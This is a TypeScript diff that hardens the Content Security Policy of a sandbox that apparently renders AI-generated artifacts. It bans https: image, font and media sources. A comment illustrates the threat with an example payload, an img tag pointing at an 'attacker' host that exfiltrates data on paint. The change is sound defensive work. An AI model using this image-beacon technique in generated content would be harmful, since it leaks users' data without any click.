@@ -24,14 +24,16 @@ export function parseArtifact(raw: unknown): Artifact | null {
 // Strict, locked-down CSP for the sandboxed frame:
 //  • default-src 'none'         → nothing loads unless explicitly allowed
 //  • script/style 'unsafe-inline' → the model's own inline JS/CSS may run
-//  • img/font/media data: https: → can show images/fonts, no arbitrary fetch
-//  • connect-src 'none'         → NO network (blocks data exfiltration)
+//  • img/font/media data: ONLY  → embedded assets render; https: is banned
+//    because <img src="https://attacker/?d=…"> is a zero-click GET that
+//    exfiltrates data on paint (connect-src does not cover image loads)
+//  • connect-src 'none'         → no fetch/XHR/WebSocket
 //  • base-uri/form-action 'none'→ no base hijack / form posts
 const CSP =
   "default-src 'none'; " +
   "script-src 'unsafe-inline' 'unsafe-eval'; " +
   "style-src 'unsafe-inline'; " +
-  "img-src data: https:; font-src data: https:; media-src data: https:; " +
+  "img-src data: blob:; font-src data:; media-src data: blob:; " +
   "connect-src 'none'; base-uri 'none'; form-action 'none'";
 
 /**
